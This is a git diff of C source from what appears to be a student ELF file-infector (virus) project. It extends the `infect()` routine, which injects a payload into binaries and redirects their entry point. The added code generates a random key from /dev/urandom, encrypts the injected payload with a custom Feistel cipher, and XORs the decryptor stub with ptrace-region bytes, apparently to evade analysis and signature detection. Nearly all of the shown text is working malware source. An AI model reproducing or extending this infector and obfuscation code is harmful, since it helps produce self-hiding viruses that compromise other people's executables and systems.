@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/25 15:31:57 by nguiard          ###   ########.fr       */
+/*   Updated: 2025/01/22 20:28:38 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,7 +14,71 @@
 
 static bool		parsing(byte *file, elf_data *data);
 
-#define _START_SIZE	0x45
+#define _START_SIZE 0x152
+
+void manual_modif(uint8_t *ptrace, uint8_t *ptrace_end, uint8_t *decrypt) {
+    while (ptrace < ptrace_end) { // While current_ptrace < end_ptrace
+        uint32_t key = *(uint32_t *)ptrace;  // Read 4 bytes from _ptrace (key)
+        uint32_t data = *(uint32_t *)decrypt; // Read 4 bytes from decrypt (encrypted data)
+        *(uint32_t *)decrypt = data ^ key;   // Decrypt using XOR and save the result
+        ptrace += 4;                         // Advance by 4 bytes in _ptrace
+        decrypt += 4;                        // Advance by 4 bytes in decrypt
+    }
+}
+
+uint32_t generate_random_key() {
+    int64_t fd;
+	open(fd, "/dev/urandom", O_RDONLY);
+    if (fd == -1) {
+        return 0;
+    }
+
+	int64_t ret;
+    uint32_t key = 0;
+	read(ret, fd, &key, sizeof(key));
+    if (ret != sizeof(key)) {
+        close(fd);
+        return 0;
+    }
+
+    close(fd);
+    return key;
+}
+
+// Fonction de Feistel
+uint32_t feistel_function(uint32_t half_block, uint32_t subkey) {
+    return (half_block ^ subkey) + ((half_block << 3) | (half_block >> 29));
+}
+
+// Chiffrement d'un seul bloc
+void feistel_encrypt_block(uint32_t *left, uint32_t *right, uint32_t key) {
+    for (int round = 0; round < 8; round++) {
+        uint32_t subkey = key ^ (round * 0x1234ABCD);
+        uint32_t temp = *right;
+        *right = *left ^ feistel_function(*right, subkey);
+        *left = temp;
+    }
+}
+
+// Chiffrement des données (en boucle sur les blocs complets uniquement)
+void feistel_encrypt(uint8_t *data, size_t size, uint32_t key) {
+    uint32_t left, right;
+
+    // Chiffrer uniquement les blocs complets de taille BLOCK_SIZE
+    size_t max_blocks = size / 8;
+    for (size_t i = 0; i < max_blocks * 8; i += 8) {
+        left = *(uint32_t *)(data + i);
+        right = *(uint32_t *)(data + i + 4);
+
+        feistel_encrypt_block(&left, &right, key);
+
+        *(uint32_t *)(data + i) = left;
+        *(uint32_t *)(data + i + 4) = right;
+    }
+
+    // Les octets restants (taille non divisible par BLOCK_SIZE) ne sont pas modifiés.
+}
+
 
 //	Infects the file located at path
 //
@@ -88,8 +152,28 @@ bool	infect(profiling *this, const str path) {
 		data.infection_offset_file + this->size + SIGNATURE_OFFSET);
 
 	int	new_jump = 0 - (data.infection_offset_mem + this->size) + data.original_entry_point_mem + 12;
+	int zero = 0;
 
+	// Write jump to original entry point and jump to decrypt if we aren't the original
 	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 315, (byte *)&zero, 4);
+
+	uint64_t key = generate_random_key();
+	if (key == 0) {
+		printf("Failed to generate a random key\n");
+		goto infect_end;
+	}
+
+	// Write the key
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 182, (byte *)&key, 4);
+
+	feistel_encrypt(data.file + data.infection_offset_file, this->size - _START_SIZE - 1, key);
+
+	byte *ptrace_start = data.file + data.infection_offset_file + this->size - 281;
+	byte *ptrace_end = data.file + data.infection_offset_file + this->size - 254;
+	byte *decrypt_start = data.file + data.infection_offset_file + this->size - 198;
+
+	manual_modif(ptrace_start, ptrace_end, decrypt_start);
 
 	// Logic ends
 	infect_end:
